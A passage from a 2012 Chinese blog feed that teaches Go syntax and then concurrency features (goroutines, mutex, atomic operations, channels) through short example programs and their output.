<p><strong>但是，我们要记住，Golang的切片是共享内存的，也就是说，没有数据的复制，只是记录从哪切到哪的信息。</strong></p>
<h4>
<span class="ez-toc-section" id="%E5%88%86%E6%94%AF%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5"></span>分支循环语句<span class="ez-toc-section-end"></span>
</h4>
<p><strong>if语句</strong></p>
<p>注意：if 语句没有圆括号，而必需要有花括号</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">//if 语句
if x % 2 == 0 {
    //...
}
//if - else
if x % 2 == 0 {
    //偶数...
} else {
    //奇数...
}

//多分支
if num &lt; 0 {
    //负数
} else if num == 0 {
    //零
} else {
    //正数
}
</pre>
<p><strong>switch 语句</strong></p>
<p>注意：switch语句没有break，还可以使用逗号case多个值</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">switch i {
    case 1:
        fmt.Println("one")
    case 2:
        fmt.Println("two")
    case 3:
        fmt.Println("three")
    case 4,5,6:
        fmt.Println("four, five, six")
    default:
        fmt.Println("invalid value!")
}
</pre>
<p><strong>for 语句</strong></p>
<p>前面你已见过了，下面再来看看for的三种形式：（注意：Go语言中没有while）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">//经典的for语句 init; condition; post
for i := 0; i&lt;10; i++{
     fmt.Println(i)
}

//精简的for语句 condition
i := 1
for i&lt;10 {
    fmt.Println(i)
    i++
}

//死循环的for语句 相当于for(;;)
i :=1
for {
    if i&gt;10 {
        break
    }
    i++
}
</pre>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8E%E5%88%86%E5%8F%B7"></span>关于分号<span class="ez-toc-section-end"></span>
</h4>
<p>从上面的代码我们可以看到代码里没有分号。其实，<strong>和C一样，Go的正式的语法使用分号来终止语句。和C不同的是，这些分号由词法分析器在扫描源代码过程中使用简单的规则自动插入分号，因此输入源代码多数时候就不需要分号了</strong>。</p>
<p>规则是这样的：如果在一个新行前方的最后一个标记是一个标识符（包括像<code>int</code>和<code>float64</code>这样的单词）、一个基本的如数值这样的文字、或以下标记中的一个时，会自动插入分号：</p>
<pre>break continue fallthrough return ++ -- ) }</pre>
<p>通常Go程序仅在<code>for</code>循环语句中使用分号，以此来分开初始化器、条件和增量单元。如果你在一行中写多个语句，也需要用分号分开。</p>
<p><strong>注意</strong>：<strong>无论任何时候，你都不应该将一个控制结构（(<code>if</code>、<code>for</code>、<code>switch</code>或<code>select</code>）的左大括号放在下一行。如果这样做，将会在大括号的前方插入一个分号，这可能导致出现不想要的结果</strong>。</p>
<h4>
<span class="ez-toc-section" id="map"></span>map<span class="ez-toc-section-end"></span>
</h4>
<p>map在别的语言里可能叫哈希表或叫dict，下面是和map的相关操作的代码，代码很容易懂</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main(){
    m := make(map[string]int) //使用make创建一个空的map

    m["one"] = 1
    m["two"] = 2
    m["three"] = 3

    fmt.Println(m) //输出 map[three:3 two:2 one:1] (顺序在运行时可能不一样)
    fmt.Println(len(m)) //输出 3

    v := m["two"] //从map里取值
    fmt.Println(v) // 输出 2

    delete(m, "two")
    fmt.Println(m) //输出 map[three:3 one:1]

    m1 := map[string]int{"one": 1, "two": 2, "three": 3}
    fmt.Println(m1) //输出 map[two:2 three:3 one:1] (顺序在运行时可能不一样)

    for key, val := range m1{
        fmt.Printf("%s =&gt; %d \n", key, val)
        /*输出：(顺序在运行时可能不一样)
            three =&gt; 3
            one =&gt; 1
            two =&gt; 2*/
    }
}
</pre>
<h4>
<span class="ez-toc-section" id="%E6%8C%87%E9%92%88"></span>指针<span class="ez-toc-section-end"></span>
</h4>
<p>Go语言一样有指针，看代码</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
var i int = 1
var pInt *int = &amp;i
//输出：i=1     pInt=0xf8400371b0       *pInt=1
fmt.Printf("i=%d\tpInt=%p\t*pInt=%d\n", i, pInt, *pInt)

*pInt = 2
//输出：i=2     pInt=0xf8400371b0       *pInt=2
fmt.Printf("i=%d\tpInt=%p\t*pInt=%d\n", i, pInt, *pInt)

i = 3
//输出：i=3     pInt=0xf8400371b0       *pInt=3
fmt.Printf("i=%d\tpInt=%p\t*pInt=%d\n", i, pInt, *pInt)

</pre>
<p>Go具有两个分配内存的机制，分别是内建的函数new和make。他们所做的事不同，所应用到的类型也不同，这可能引起混淆，但规则却很简单。</p>
<h4>
<span class="ez-toc-section" id="%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D"></span><strong>内存分配 </strong><span class="ez-toc-section-end"></span>
</h4>
<p><strong>new</strong> 是一个分配内存的内建函数，但不同于其他语言中同名的new所作的工作，<strong>它只是将内存清零，而不是初始化内存</strong>。new(T)为一个类型为T的新项目分配了值为零的存储空间并返回其地址，也就是一个类型为*T的值。用Go的术语来说，就是<strong>它返回了一个指向新分配的类型为T的零值的指针</strong>。</p>
<p><code><strong>make</strong>(T, </code><em>args</em><code>)</code>函数的目的与<code>new(T)</code>不同。它仅用于创建切片、map和chan（消息管道），并返回类型<code>T</code>（不是<code>*T</code>）的一个<strong>被初始化了的</strong>（不是<strong>零</strong>）实例。这种差别的出现是由于这三种类型实质上是对在使用前必须进行初始化的数据结构的引用。例如，切片是一个具有三项内容的描述符，包括指向数据（在一个数组内部）的指针、长度以及容量，在这三项内容被初始化之前，切片值为<code>nil</code>。对于切片、映射和信道，<code>make</code>初始化了其内部的数据结构并准备了将要使用的值。如：</p>
<p>下面的代码分配了一个整型数组，长度为10，容量为100，并返回前10个数组的切片</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">make([]int, 10, 100)</pre>
<p>以下示例说明了<code>new</code>和<code>make</code>的不同。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">var p *[]int = new([]int)   // 为切片结构分配内存；*p == nil；很少使用
var v  []int = make([]int, 10) // 切片v现在是对一个新的有10个整数的数组的引用

// 不必要地使问题复杂化：
var p *[]int = new([]int)
fmt.Println(p) //输出：&amp;[]
*p = make([]int, 10, 10)
fmt.Println(p) //输出：&amp;[0 0 0 0 0 0 0 0 0 0]
fmt.Println((*p)[2]) //输出： 0

// 习惯用法:
v := make([]int, 10)
fmt.Println(v) //输出：[0 0 0 0 0 0 0 0 0 0]
</pre>
<h4>
<span class="ez-toc-section" id="%E5%87%BD%E6%95%B0"></span>函数<span class="ez-toc-section-end"></span>
</h4>
<p>老实说，我对Go语言这种反过来声明变量类型和函数返回值的做法有点不满（保持和C一样的不可以吗? 呵呵）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
import "fmt"

func max(a int, b int) int { //注意参数和返回值是怎么声明的

    if a &gt; b {
        return a
    }
    return b
}

func main(){
    fmt.Println(max(4, 5))
}

</pre>
<p><strong>函数返回多个值</strong></p>
<p>Go中很多Package 都会返回两个值，一个是正常值，一个是错误，如下所示：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
import "fmt"

func main(){
    v, e := multi_ret("one")
    fmt.Println(v,e) //输出 1 true

    v, e = multi_ret("four")
    fmt.Println(v,e) //输出 0 false

    //通常的用法(注意分号后有e)
    if v, e = multi_ret("four"); e {
        // 正常返回
    }else{
        // 出错返回
    }
}

func multi_ret(key string) (int, bool){
    m := map[string]int{"one": 1, "two": 2, "three": 3}

    var err bool
    var val int

    val, err = m[key]

    return val, err
}
</pre>
<p><strong>函数不定参数</strong></p>
<p>例子很清楚了，我就不多说了</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func sum(nums ...int) {
    fmt.Print(nums, " ")  //输出如 [1, 2, 3] 之类的数组
    total := 0
    for _, num := range nums { //要的是值而不是下标
        total += num
    }
    fmt.Println(total)
}
func main() {
    sum(1, 2)
    sum(1, 2, 3)

    //传数组
    nums := []int{1, 2, 3, 4}
    sum(nums...)
}</pre>
<p><strong>函数闭包</strong></p>
<p>nextNum这个函数返回了一个匿名函数，这个匿名函数记住了nextNum中i+j的值，并改变了i,j的值，于是形成了一个闭包的用法</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func nextNum() func() int {
    i,j := 1,1
    return func() int {
        var tmp = i+j
        i, j = j, tmp
        return tmp
    }
}
//main函数中是对nextNum的调用，其主要是打出下一个斐波拉契数
func main(){
    nextNumFunc := nextNum()
    for i:=0; i&lt;10; i++ {
        fmt.Println(nextNumFunc())
    }
}
</pre>
<p><strong>函数的递归</strong></p>
<p>和c基本是一样的</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func fact(n int) int {
    if n == 0 {
        return 1
    }
    return n * fact(n-1)
}

func main() {
    fmt.Println(fact(7))
}</pre>
<h4>
<span class="ez-toc-section" id="%E7%BB%93%E6%9E%84%E4%BD%93"></span>结构体<span class="ez-toc-section-end"></span>
</h4>
<p>Go的结构体和C的基本上一样，不过在初始化时有些不一样，Go支持带名字的初始化。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">type Person struct {
    name string
    age  int
    email string
}

func main() {
    //初始化
    person := Person{"Tom", 30, "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="dbafb4b69bbcb6bab2b7f5b8b4b6">[email protected]</a>"}
    person = Person{name:"Tom", age: 30, email:"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a4d0cbc9e4c3c9c5cdc88ac7cbc9">[email protected]</a>"}

    fmt.Println(person) //输出 {Tom 30 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c3b7acae83a4aea2aaafeda0acae">[email protected]</a>}

    pPerson := &amp;person

    fmt.Println(pPerson) //输出 &amp;{Tom 30 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="92e6fdffd2f5fff3fbfebcf1fdff">[email protected]</a>}

    pPerson.age = 40
    person.name = "Jerry"
    fmt.Println(person) //输出 {Jerry 40 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c9bda6a489aea4a8a0a5e7aaa6a4">[email protected]</a>}
}
</pre>
<h4>
<span class="ez-toc-section" id="%E7%BB%93%E6%9E%84%E4%BD%93%E6%96%B9%E6%B3%95"></span>结构体方法<span class="ez-toc-section-end"></span>
</h4>
<p>不多说了，看代码吧。</p>
<p>注意：Go语言中没有public, protected, private的关键字，所以，<strong>如果你想让一个方法可以被别的包访问的话，你需要把这个方法的第一个字母大写。这是一种约定</strong>。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">type rect struct {
    width, height int
}

func (r *rect) area() int { //求面积
    return r.width * r.height
}

func (r *rect) perimeter() int{ //求周长
    return 2*(r.width + r.height)
}

func main() {
    r := rect{width: 10, height: 15}

    fmt.Println("面积: ", r.area())
    fmt.Println("周长: ", r.perimeter())

    rp := &amp;r
    fmt.Println("面积: ", rp.area())
    fmt.Println("周长: ", rp.perimeter())
}
</pre>
<h4>
<span class="ez-toc-section" id="%E6%8E%A5%E5%8F%A3%E5%92%8C%E5%A4%9A%E6%80%81"></span>接口和多态<span class="ez-toc-section-end"></span>
</h4>
<p>接口意味着多态，下面是一个经典的例子，不用多说了，自己看代码吧。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">//---------- 接 口 --------//
type shape interface {
    area() float64 //计算面积
    perimeter() float64 //计算周长
}

//--------- 长方形 ----------//
type rect struct {
    width, height float64
}

func (r *rect) area() float64 { //面积
    return r.width * r.height
}

func (r *rect) perimeter() float64 { //周长
    return 2*(r.width + r.height)
}

//----------- 圆  形 ----------//
type circle struct {
    radius float64
}

func (c *circle) area() float64 { //面积
    return math.Pi * c.radius * c.radius
}

func (c *circle) perimeter() float64 { //周长
    return 2 * math.Pi * c.radius
}

// ----------- 接口的使用 -----------//
func interface_test() {
    r := rect {width:2.9, height:4.8}
    c := circle {radius:4.3}

    s := []shape{&amp;r, &amp;c} //通过指针实现

    for _, sh := range s {
        fmt.Println(sh)
        fmt.Println(sh.area())
        fmt.Println(sh.perimeter())
    }
}
</pre>
<h4>
<span class="ez-toc-section" id="%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86_-_Error%E6%8E%A5%E5%8F%A3"></span>错误处理 – Error接口<span class="ez-toc-section-end"></span>
</h4>
<p>函数错误返回可能是C/C++时最让人纠结的东西的，Go的多值返回可以让我们更容易的返回错误，其可以在返回一个常规的返回值之外，还能轻易地返回一个详细的错误描述。通常情况下，错误的类型是error，它有一个内建的接口。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">type error interface {
    Error() string
}</pre>
<p>还是看个示例吧：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import "fmt"
import "errors"

//自定义的出错结构
type myError struct {
    arg  int
    errMsg string
}
//实现Error接口
func (e *myError) Error() string {
    return fmt.Sprintf("%d - %s", e.arg, e.errMsg)
}

//两种出错
func error_test(arg int) (int, error) {
    if arg &lt; 0  {
         return -1, errors.New("Bad Arguments - negtive!")
     }else if arg &gt;256 {
        return -1, &amp;myError{arg, "Bad Arguments - too large!"}
    }
    return arg*arg, nil
}

//相关的测试
func main() {
    for _, i := range []int{-1, 4, 1000} {
        if r, e := error_test(i); e != nil {
            fmt.Println("failed:", e)
        } else {
            fmt.Println("success:", r)
        }
    }
}</pre>
<p>程序运行后输出：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">failed: Bad Arguments - negtive!
success: 16
failed: 1000 - Bad Arguments - too large!
</pre>
<h4>
<span class="ez-toc-section" id="%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86_-_Defer"></span>错误处理 – Defer<span class="ez-toc-section-end"></span>
</h4>
<p>下面的程序对于每一个熟悉C语言的人来说都不陌生（有资源泄露的问题），C++使用RAII来解决这种问题。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func CopyFile(dstName, srcName string) (written int64, err error) {
    src, err := os.Open(srcName)
    if err != nil {
        return
    }

    dst, err := os.Create(dstName)
    if err != nil {
        return
    }

    written, err = io.Copy(dst, src)
    dst.Close()
    src.Close()
    return
}</pre>
<p>Go语言引入了Defer来确保那些被打开的文件能被关闭。如下所示：（这种解决方式还是比较优雅的）</p>
<p>&lt;</p>
<p>pre class=”EnlighterJSRAW” data-enlighter-language=”golang” data-enlighter-highlight=”6,12″&gt;<br>
func CopyFile(dstName, srcName string) (written int64, err error) {<br>
src, err := os.Open(srcName)<br>
if err != nil {<br>
return<br>
}<br>
defer src.Close()</p>
<pre><code>dst, err := os.Create(dstName)
if err != nil {
    return
}
defer dst.Close()

return io.Copy(dst, src)
</code></pre>
<p>}[/c]</p>
<p>Go的defer语句预设一个函数调用（延期的函数），该调用在函数执行defer返回时立刻运行。该方法显得不同常规，但却是处理上述情况很有效，无论函数怎样返回，都必须进行资源释放。</p>
<p>我们再来看一个defer函数的示例：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">for i := 0; i &lt; 5; i++ {
    defer fmt.Printf("%d ", i)
}</pre>
<p>被延期的函数以后进先出（LIFO）的顺行执行，因此以上代码在返回时将打印4 3 2 1 0。</p>
<p>总之，我个人觉得defer的函数行为有点怪异，我现在还没有完全搞清楚。</p>
<h4>
<span class="ez-toc-section" id="%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86_-_PanicRecover"></span>错误处理 – Panic/Recover<span class="ez-toc-section-end"></span>
</h4>
<p>对于不可恢复的错误，Go提供了一个内建的panic函数，它将创建一个运行时错误并使程序停止（相当暴力）。该函数接收一个任意类型（往往是字符串）作为程序死亡时要打印的东西。当编译器在函数的结尾处检查到一个panic时，就会停止进行常规的return语句检查。</p>
<p>下面的仅仅是一个示例。实际的库函数应避免panic。如果问题可以容忍，最好是让事情继续下去而不是终止整个程序。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">var user = os.Getenv("USER")

func init() {
    if user == "" {
        panic("no value for $USER")
    }
}</pre>
<p>当panic被调用时，它将立即停止当前函数的执行并开始逐级解开函数堆栈，同时运行所有被defer的函数。如果这种解开达到堆栈的顶端，程序就死亡了。但是，也可以使用内建的recover函数来重新获得Go程的控制权并恢复正常的执行。 对recover的调用会通知解开堆栈并返回传递到panic的参量。由于仅在解开期间运行的代码处在被defer的函数之内，recover仅在被延期的函数内部才是有用的。</p>
<p>你可以简单地理解为recover就是用来捕捉Painc的，防止程序一下子就挂掉了。</p>
<p>下面是一个例程，很简单了，不解释了</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func g(i int) {
    if i&gt;1 {
        fmt.Println("Panic!")
        panic(fmt.Sprintf("%v", i))
    }

}

func f() {
    defer func() {
        if r := recover(); r != nil {
            fmt.Println("Recovered in f", r)
        }
    }()

    for i := 0; i &lt; 4; i++ {
        fmt.Println("Calling g with ", i)
        g(i)
        fmt.Println("Returned normally from g.")
     }
}

func main() {
    f()
    fmt.Println("Returned normally from f.")
}</pre>
<p>运行结果如下：（我们可以看到Painc后的for循环就没有往下执行了，但是main的程序还在往下走）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">Calling g with  0
Returned normally from g.
Calling g with  1
Returned normally from g.
Calling g with  2
Panic!
Recovered in f 2
Returned normally from f.
</pre>
<p>你习惯这种编程方式吗？我觉得有点诡异。呵呵。</p>
<p>好了，上面是是一Go语言相关的编程语法的介绍，我没有事无巨细，只是让你了解一下Go语言是长什么样的。<strong>当然，这还没完，请期待下篇——Go语言的特性</strong>。</p>
 ]]></content>
<pubDate>2012-11-06T08:27:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/8460.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Go 语言简介（下）— 特性 ]]></title>
<link>https://coolshell.cn/articles/8489.html</link>
<content><![CDATA[ 
<p>希望你看到这篇文章的时候还是在公交车和地铁上正在上下班的时间，我希望我的这篇文章可以让你利用这段时间了解一门语言。当然，希望你不会因为看我的文章而错过站。呵呵。</p>
<p>如果你还不了解Go语言的语法，还请你移步先看一下上篇——《<strong><a title="Go语言简介（上）：语法" href="https://coolshell.cn/articles/8460.html" target="_blank" rel="noopener noreferrer">Go语言简介（上）：语法</a></strong>》</p>
<p><img alt="image placeholder" ></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#goroutine" title="goroutine">goroutine</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#goroutine%E7%9A%84%E5%B9%B6%E5%8F%91%E5%AE%89%E5%85%A8%E6%80%A7" title="goroutine的并发安全性">goroutine的并发安全性</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C" title="原子操作">原子操作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Channel_%E4%BF%A1%E9%81%93" title="Channel 信道">Channel 信道</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%AE%9A%E6%97%B6%E5%99%A8" title="定时器">定时器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Socket%E7%BC%96%E7%A8%8B" title="Socket编程">Socket编程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" title="系统调用">系统调用</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E8%A1%8C" title="执行命令行">执行命令行</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0" title="命令行参数">命令行参数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84HTTP_Server" title="一个简单的HTTP Server">一个简单的HTTP Server</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="goroutine"></span>goroutine<span class="ez-toc-section-end"></span>
</h4>
<p>GoRoutine主要是使用go关键字来调用函数，你还可以使用匿名函数，如下所示：</p>
<p><span id="more-8489"></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="9,11">package main
import "fmt"

func f(msg string) {
    fmt.Println(msg)
}

func main(){
    go f("goroutine")

    go func(msg string) {
        fmt.Println(msg)
    }("going")
}</pre>
<p>我们再来看一个示例，下面的代码中包括很多内容，包括时间处理，随机数处理，还有goroutine的代码。如果你熟悉C语言，你应该会很容易理解下面的代码。</p>
<p>你可以简单的把go关键字调用的函数想像成pthread_create。下面的代码使用for循环创建了3个线程，每个线程使用一个随机的Sleep时间，然后在routine()函数中会输出一些线程执行的时间信息。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import "fmt"
import "time"
import "math/rand"

func routine(name string, delay time.Duration) {

    t0 := time.Now()
    fmt.Println(name, " start at ", t0)

    time.Sleep(delay)

    t1 := time.Now()
    fmt.Println(name, " end at ", t1)

    fmt.Println(name, " lasted ", t1.Sub(t0))
}

func main() {

    //生成随机种子
    rand.Seed(time.Now().Unix())

    var name string
    for i:=0; i&lt;3; i++{
        name = fmt.Sprintf("go_%02d", i) //生成ID
        //生成随机等待时间，从0-4秒
        go routine(name, time.Duration(rand.Intn(5)) * time.Second)
    }

    //让主进程停住，不然主进程退了，goroutine也就退了
    var input string
    fmt.Scanln(&amp;input)
    fmt.Println("done")
}
</pre>
<p>运行的结果可能是：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">go_00  start at  2012-11-04 19:46:35.8974894 +0800 +0800
go_01  start at  2012-11-04 19:46:35.8974894 +0800 +0800
go_02  start at  2012-11-04 19:46:35.8974894 +0800 +0800
go_01  end at  2012-11-04 19:46:36.8975894 +0800 +0800
go_01  lasted  1.0001s
go_02  end at  2012-11-04 19:46:38.8987895 +0800 +0800
go_02  lasted  3.0013001s
go_00  end at  2012-11-04 19:46:39.8978894 +0800 +0800
go_00  lasted  4.0004s
</pre>
<h4>
<span class="ez-toc-section" id="goroutine%E7%9A%84%E5%B9%B6%E5%8F%91%E5%AE%89%E5%85%A8%E6%80%A7"></span>goroutine的并发安全性<span class="ez-toc-section-end"></span>
</h4>
<p>关于goroutine，我试了一下，无论是Windows还是Linux，基本上来说是用操作系统的线程来实现的。不过，goroutine有个特性，也就是说，<strong>如果一个goroutine没有被阻塞，那么别的goroutine就不会得到执行</strong>。这并不是真正的并发，如果你要真正的并发，你需要在你的main函数的第一行加上下面的这段代码：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">import "runtime"
...
runtime.GOMAXPROCS(4)</pre>
<p>还是让我们来看一个有并发安全性问题的示例（注意：我使用了C的方式来写这段Go的程序）</p>
<p>这是一个经常出现在教科书里卖票的例子，我启了5个goroutine来卖票，卖票的函数sell_tickets很简单，就是随机的sleep一下，然后对全局变量total_tickets作减一操作。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import "fmt"
import "time"
import "math/rand"
import "runtime"

var total_tickets int32 = 10;

func sell_tickets(i int){
    for{
        if total_tickets &gt; 0 { //如果有票就卖
            time.Sleep( time.Duration(rand.Intn(5)) * time.Millisecond)
            total_tickets-- //卖一张票
            fmt.Println("id:", i, "  ticket:", total_tickets)
        }else{
            break
        }
    }
}

func main() {
    runtime.GOMAXPROCS(4) //我的电脑是4核处理器，所以我设置了4
    rand.Seed(time.Now().Unix()) //生成随机种子

    for i := 0; i &lt; 5; i++ { //并发5个goroutine来卖票
         go sell_tickets(i)
    }
    //等待线程执行完
    var input string
    fmt.Scanln(&amp;input)
    fmt.Println(total_tickets, "done") //退出时打印还有多少票
}</pre>
<p>这个程序毋庸置疑有并发安全性问题，所以执行起来你会看到下面的结果：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">$go run sell_tickets.go
id: 0   ticket: 9  
id: 0   ticket: 8  
id: 4   ticket: 7  
id: 1   ticket: 6  
id: 3   ticket: 5  
id: 0   ticket: 4  
id: 3   ticket: 3  
id: 2   ticket: 2  
id: 0   ticket: 1  
id: 3   ticket: 0  
id: 1   ticket: -1  
id: 4   ticket: -2  
id: 2   ticket: -3  
id: 0   ticket: -4  
-4 done</pre>
<p>可见，我们需要使用上锁，我们可以使用互斥量来解决这个问题。下面的代码，我只列出了修改过的内容：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="5,9,13,19"> package main
import "fmt"
import "time"
import "math/rand"
import "sync"
import "runtime"

var total_tickets int32 = 10;
var mutex = &amp;sync.Mutex{} //可简写成：var mutex sync.Mutex

func sell_tickets(i int){
    for total_tickets&gt;0 {
        mutex.Lock()
        if total_tickets &gt; 0 {
            time.Sleep( time.Duration(rand.Intn(5)) * time.Millisecond)
            total_tickets--
            fmt.Println(i, total_tickets)
        }
        mutex.Unlock()
    }
}
.......
......
</pre>
<h4>
<span class="ez-toc-section" id="%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C"></span>原子操作<span class="ez-toc-section-end"></span>
</h4>
<p>说到并发就需要说说原子操作，相信大家还记得我写的那篇《<a title="无锁队列的实现" href="https://coolshell.cn/articles/8239.html" target="_blank" rel="noopener noreferrer">无锁队列的实现</a>》一文，里面说到了一些CAS – CompareAndSwap的操作。Go语言也支持。你可以看一下相当的文档</p>
<p>我在这里就举一个很简单的示例：下面的程序有10个goroutine，每个会对cnt变量累加20次，所以，最后的cnt应该是200。如果没有atomic的原子操作，那么cnt将有可能得到一个小于200的数。</p>
<p>下面使用了atomic操作，所以是安全的。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="5,13,18">package main

import "fmt"
import "time"
import "sync/atomic"

func main() {
    var cnt uint32 = 0
    for i := 0; i &lt; 10; i++ {
        go func() {
            for i:=0; i&lt;20; i++ {
                time.Sleep(time.Millisecond)
                atomic.AddUint32(&amp;cnt, 1)
            }
        }()
    }
    time.Sleep(time.Second)//等一秒钟等goroutine完成
    cntFinal := atomic.LoadUint32(&amp;cnt)//取数据
    fmt.Println("cnt:", cntFinal)
}</pre>
<p>这样的函数还有很多，参看<a href="https://golang.org/pkg/sync/atomic/" target="_blank" rel="noopener noreferrer">go的atomic包文档</a>（被墙）</p>
<h4>
<span class="ez-toc-section" id="Channel_%E4%BF%A1%E9%81%93"></span>Channel 信道<span class="ez-toc-section-end"></span>
</h4>
<p>Channal是什么？Channal就是用来通信的，就像Unix下的管道一样，在Go中是这样使用Channel的。</p>
<p>下面的程序演示了一个goroutine和主程序通信的例程。这个程序足够简单了。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="7,10">package main

import "fmt"

func main() {
    //创建一个string类型的channel
    channel := make(chan string)

    //创建一个goroutine向channel里发一个字符串
    go func() { channel &lt;- "hello" }()

    msg := &lt;- channel
    fmt.Println(msg)
}[</pre>
<p><strong>指定channel的buffer</strong></p>
<p>指定buffer的大小很简单，看下面的程序：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="5">package main
import "fmt"

func main() {
    channel := make(chan string, 2)

    go func() {
        channel &lt;- "hello"
        channel &lt;- "World"
    }()

    msg1 := &lt;-channel
    msg2 := &lt;-channel
    fmt.Println(msg1, msg2)
}</pre>
<p><strong>Channel的阻塞</strong></p>
<p>注意，channel默认上是阻塞的，也就是说，如果Channel满了，就阻塞写，如果Channel空了，就阻塞读。于是，我们就可以使用这种特性来同步我们的发送和接收端。</p>
<p>下面这个例程说明了这一点，代码有点乱，不过我觉得不难理解。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import "fmt"
import "time"

func main() {

    channel := make(chan string) //注意: buffer为1

    go func() {
        channel &lt;- "hello"
        fmt.Println("write \"hello\" done!")

        channel &lt;- "World" //Reader在Sleep，这里在阻塞
        fmt.Println("write \"World\" done!")

        fmt.Println("Write go sleep...")
        time.Sleep(3*time.Second)
        channel &lt;- "channel"
        fmt.Println("write \"channel\" done!")
    }()

    time.Sleep(2*time.Second)
    fmt.Println("Reader Wake up...")

    msg := &lt;-channel
    fmt.Println("Reader: ", msg)

    msg = &lt;-channel
    fmt.Println("Reader: ", msg)

    msg = &lt;-channel //Writer在Sleep，这里在阻塞
    fmt.Println("Reader: ", msg)
}</pre>
<p>上面的代码输出的结果如下：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">Reader Wake up...
Reader:  hello
write "hello" done!
write "World" done!
Write go sleep...
Reader:  World
write "channel" done!
Reader:  channel
</pre>
<p><strong>Channel阻塞的这个特性还有一个好处是，可以让我们的goroutine在运行的一开始就阻塞在从某个channel领任务，这样就可以作成一个类似于线程池一样的东西。关于这个程序我就不写了。我相信你可以自己实现的。</strong></p>
<p><strong>多个Channel的select</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
import "time"
import "fmt"

func main() {
    //创建两个channel - c1 c2
    c1 := make(chan string)
    c2 := make(chan string)

    //创建两个goruntine来分别向这两个channel发送数据
    go func() {
        time.Sleep(time.Second * 1)
        c1 &lt;- "Hello"
    }()
    go func() {
        time.Sleep(time.Second * 1)
        c2 &lt;- "World"
    }()

    //使用select来侦听两个channel
